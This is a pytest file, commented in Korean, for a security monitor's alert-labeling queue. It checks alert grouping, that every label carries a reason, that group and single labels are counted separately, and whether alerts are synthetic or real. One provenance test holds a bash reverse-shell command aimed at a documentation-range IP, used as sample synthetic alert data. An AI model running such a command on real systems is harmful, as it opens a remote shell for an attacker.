"""라벨링 큐 (ML 재학습의 병목).

`scripts/eval_ml.py` 는 두 가지가 없어 성능을 '측정 불가'로 둔다 — 실트래픽
피처와 **사람 라벨**이다. 피처는 서버를 돌리면 모이지만 라벨은 사람이 붙여야
하고, 알림이 11만 건이라 한 건씩 보는 건 불가능하다.

**실측이 설계를 바꿨다.** 11만 건을 (위협유형·룰ID·정규화된 설명)으로 묶으니
서로 다른 그룹이 **67개**뿐이었다. 상위 15개가 전체의 61%를 덮는다.

이 테스트가 지키는 불변식 셋:

1. **같은 종류는 같은 그룹으로 묶인다** — 숫자만 다른 설명이 갈라지면 그룹이
   수천 개가 되어 라벨링이 다시 불가능해진다.
2. **그룹 라벨과 개별 라벨을 나눠 센다** — 한 번의 판정으로 수천 건이 덮이지만
   개별 검토보다 약한 증거다. 합쳐 세면 '측정 가능' 문턱을 낮은 품질로 넘기게
   된다. **자기 지표를 스스로 속이는 것**이라 반드시 막는다.
3. **근거 없는 라벨은 받지 않는다** — 나중에 되짚을 수 없는 라벨은 재료가 아니다.
"""
import pytest

from modules.labeling import (LabelStore, build_queue, group_key,
                              normalize_description)


@pytest.fixture
def labels(tmp_path):
    store = LabelStore(db_path=str(tmp_path / "labels.db"))
    yield store
    store.close()


@pytest.fixture
def alerts(tmp_path):
    from modules.alert_store import AlertStore
    from modules.threat_detector import Alert

    store = AlertStore(str(tmp_path / "alerts.db"))
    def add(threat_type, desc, src="203.0.113.5", severity="HIGH", n=1):
        for i in range(n):
            a = Alert(threat_type, severity, src, "10.0.0.1", desc)
            a.timestamp = f"2026-08-2{i % 9} 10:00:00"
            store.save(a)
    store.add = add
    yield store
    store.close()


# ─────────────── 묶기 ───────────────

@pytest.mark.parametrize("a,b", [
    ("포트 4444 스캔 시도", "포트 8080 스캔 시도"),
    ("[EDR] 리버스 셸 — bash(pid 1234, www-data)", "[EDR] 리버스 셸 — bash(pid 99, www-data)"),
    ("실패 12회", "실패 3회"),
])
def test_numbers_do_not_split_groups(a, b):
    """숫자만 다른 설명은 분석가에게 같은 판단을 요구한다."""
    assert normalize_description(a) == normalize_description(b)


def test_different_meanings_stay_separate():
    assert normalize_description("SQL 인젝션 시도") != normalize_description("포트 스캔 시도")
    assert group_key("WEB_ATTACK", "R1", "x") != group_key("BRUTE_FORCE", "R1", "x")
    assert group_key("WEB_ATTACK", "R1", "x") != group_key("WEB_ATTACK", "R2", "x")


def test_queue_ranks_by_how_much_one_decision_covers(alerts):
    """정보량이 큰 것부터 봐야 라벨링이 끝난다."""
    alerts.add("BRUTE_FORCE", "인증 실패 5회", n=30)
    alerts.add("WEB_ATTACK", "SQL 인젝션 시도", n=10)
    alerts.add("PORT_SCAN", "포트 22 스캔", n=3)
    queue = build_queue(alerts, None)
    counts = [g["count"] for g in queue["groups"]]
    assert counts == sorted(counts, reverse=True)
    assert queue["summary"]["groups"] == 3
    assert queue["summary"]["total_alerts"] == 43
    assert queue["groups"][0]["coverage_pct"] > 60


def test_queue_hides_already_labeled_groups(alerts, labels):
    alerts.add("BRUTE_FORCE", "인증 실패 5회", n=10)
    alerts.add("WEB_ATTACK", "SQL 인젝션", n=5)
    first = build_queue(alerts, labels)["groups"][0]
    labels.put(first["key"], "TRUE_POSITIVE", "분석가", "실제 브루트포스", covers=10)

    queue = build_queue(alerts, labels)
    assert first["key"] not in [g["key"] for g in queue["groups"]]
    assert queue["summary"]["labeled_groups"] == 1
    assert queue["summary"]["covered_alerts"] == 10

    with_labeled = build_queue(alerts, labels, include_labeled=True)
    labeled = next(g for g in with_labeled["groups"] if g["key"] == first["key"])
    assert labeled["label"]["verdict"] == "TRUE_POSITIVE"


def test_queue_exposes_homogeneity_hints(alerts):
    """그룹이 균질한지 판단할 재료를 준다 — 아니면 뭉뚱그려 판정하면 안 된다."""
    for i in range(5):
        alerts.add("BRUTE_FORCE", "인증 실패", src=f"203.0.113.{i}")
    group = build_queue(alerts, None)["groups"][0]
    assert group["unique_sources"] == 5
    assert group["severities"] and group["first_seen"] and group["last_seen"]
    assert group["sample_alert_id"], "표본 알림이 없으면 내용을 확인할 수 없다"


def test_queue_without_store_is_empty_not_broken():
    queue = build_queue(None, None)
    assert queue["groups"] == [] and queue["summary"]["total_alerts"] == 0


# ─────────────── 라벨 저장 ───────────────

def test_label_requires_a_reason(labels):
    """근거 없는 라벨은 나중에 되짚을 수 없다 — 알림 판정과 같은 기준."""
    with pytest.raises(ValueError):
        labels.put("k", "TRUE_POSITIVE", "분석가", "")
    with pytest.raises(ValueError):
        labels.put("k", "TRUE_POSITIVE", "분석가", "  ")


def test_invalid_verdict_is_rejected(labels):
    with pytest.raises(ValueError):
        labels.put("k", "아마도", "분석가", "잘 모르겠음")


def test_relabeling_replaces_not_duplicates(labels):
    labels.put("k", "TRUE_POSITIVE", "분석가", "처음엔 정탐", covers=10)
    labels.put("k", "FALSE_POSITIVE", "분석가", "다시 보니 오탐", covers=10)
    rows = labels.all_labels()
    assert len(rows) == 1 and rows[0]["verdict"] == "FALSE_POSITIVE"


# ─────────────── ★ 지표를 속이지 않는가 ───────────────

def test_group_and_single_labels_are_counted_separately(labels):
    """**이 프로젝트에서 가장 중요한 불변식.**

    그룹 판정 한 번으로 수천 건이 덮이지만 그건 개별 검토보다 약한 증거다.
    합쳐 세면 'precision/recall 측정 가능' 문턱을 낮은 품질의 라벨로 넘기게 된다.
    """
    labels.put("g1", "TRUE_POSITIVE", "분석가", "브루트포스 맞음", covers=5000)
    labels.put("g2", "FALSE_POSITIVE", "분석가", "내부 스캐너", covers=3000)
    labels.put("g3", "TRUE_POSITIVE", "분석가", "개별 확인", scope="single", alert_id=42)

    stats = labels.stats()
    assert stats["group"]["decisions"] == 2
    assert stats["group"]["covers"] == 8000
    assert stats["single"]["decisions"] == 1
    assert stats["single"]["covers"] == 1, "개별 라벨이 그룹처럼 부풀려졌다"


def test_eval_script_does_not_let_group_labels_pass_the_threshold(tmp_path, monkeypatch):
    """평가 스크립트가 그룹 라벨로 '측정 가능' 판정을 내리면 안 된다."""
    import importlib
    import sys

    sys.path.insert(0, str(tmp_path.parent))
    eval_ml = importlib.import_module("scripts.eval_ml") if "scripts.eval_ml" in sys.modules \
        else importlib.import_module("scripts.eval_ml")

    store = LabelStore(db_path=str(tmp_path / "labels.db"))
    try:
        for i in range(50):
            store.put(f"g{i}", "TRUE_POSITIVE", "분석가", "그룹 판정", covers=2000)
    finally:
        store.close()

    counts = eval_ml._group_label_counts(str(tmp_path / "labels.db"))
    assert counts["group_decisions"] == 50
    assert counts["group_covers"] == 100_000
    # 그룹 라벨이 아무리 많아도 개별 라벨 수를 늘리지 않는다
    assert counts["single_decisions"] == 0


# --------------------------------------------------------------------------- #
#  출처(provenance) — 합성 알림으로 정답지를 만들지 않기 위한 층
#
#  실측: 알림 110,894건 중 합성 표지가 없는 것은 183건(0.16%)뿐이었다.
#  허니팟 데모·퍼플팀 TEST-NET·데모 평판·허니넷 SIMULATED 로그·threat_detector
#  데모 카탈로그·EDR 데모 주입 프로세스가 나머지를 만든다. 이걸 모른 채 상위
#  그룹을 '정탐'으로 판정하면 생성기가 의도한 바를 확인하는 라벨이 될 뿐이다.
# --------------------------------------------------------------------------- #
import json as _json

from modules.labeling import (PROVENANCE_REAL, PROVENANCE_SYNTHETIC,
                              classify_provenance)


def test_details_demo_flag_is_synthetic():
    assert classify_provenance("x", _json.dumps({"demo": True}))[0] == PROVENANCE_SYNTHETIC


def test_stored_origin_demo_is_synthetic():
    assert classify_provenance("x", "{}", stored_origin="demo")[0] == PROVENANCE_SYNTHETIC


def test_legacy_stored_origin_is_not_trusted():
    """아카이브 11만 건이 전부 'legacy' 다 — 실측이라는 뜻이 아니다."""
    origin, why = classify_provenance(
        "x", _json.dumps({"demo": True}), stored_origin="legacy")
    assert origin == PROVENANCE_SYNTHETIC, why


def test_testnet_ip_is_synthetic():
    """퍼플팀 하네스는 실제 공격 대신 RFC 5737 문서용 대역을 쓴다."""
    d = _json.dumps({"cmdline": "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1"})
    assert classify_provenance("[Sigma] Reverse Shell", d)[0] == PROVENANCE_SYNTHETIC


def test_threat_detector_demo_catalog_is_synthetic():
    """데모 생성기의 문구는 실제 탐지 경로가 만들어내지 않는다."""
    from modules.threat_detector import ThreatDetector

    for row in ThreatDetector._DEMO_THREATS:
        assert classify_provenance(row[4], "{}")[0] == PROVENANCE_SYNTHETIC, row[4]


def test_edr_demo_cmdlines_are_synthetic():
    from modules.edr import DEMO_THREAT_PROCESSES

    for _, proc in DEMO_THREAT_PROCESSES:
        d = _json.dumps({"cmdline": proc["cmdline"]})
        assert classify_provenance("[EDR] 무엇이든", d)[0] == PROVENANCE_SYNTHETIC


def test_unmarked_alert_is_real():
    d = _json.dumps({"signature_id": 1917, "source": "snort"})
    origin, why = classify_provenance("[Snort SID 1917] SCAN UPnP", d)
    assert origin == PROVENANCE_REAL
    assert "없음" in why, "real 은 '실측 보장' 이 아니라 '합성 표지 없음' 이다"


def test_demo_alerts_are_stamped_demo():
    """데모 생성기가 만든 Alert 는 origin='demo' 여야 한다.

    details 를 안 넘기면 Alert.origin 이 'real' 로 찍혀 데모가 실측으로 둔갑한다.
    """
    from modules.threat_detector import ThreatDetector

    det = ThreatDetector.__new__(ThreatDetector)
    made = []
    det._add_alert = made.append
    det._rand_ip = lambda t: t.replace("{}", "9")
    det._demo_create_random_alert()
    assert made and made[0].origin == "demo", "데모 알림이 실측으로 기록됐다"


def test_authlog_detects_simulated_source(tmp_path):
    """SIMULATED 헤더가 있는 auth.log 를 tail 하는 건 실동작이지만 내용은 합성이다."""
    from modules.authlog_parser import AuthLogMonitor

    sim = tmp_path / "auth.log"
    sim.write_text("# SIMULATED SSH auth.log — 검증용\n", encoding="utf-8")
    assert AuthLogMonitor._looks_simulated(str(sim)) is True

    real = tmp_path / "real.log"
    real.write_text("Sep  5 10:00:00 host sshd[1]: Accepted password for u\n", encoding="utf-8")
    assert AuthLogMonitor._looks_simulated(str(real)) is False
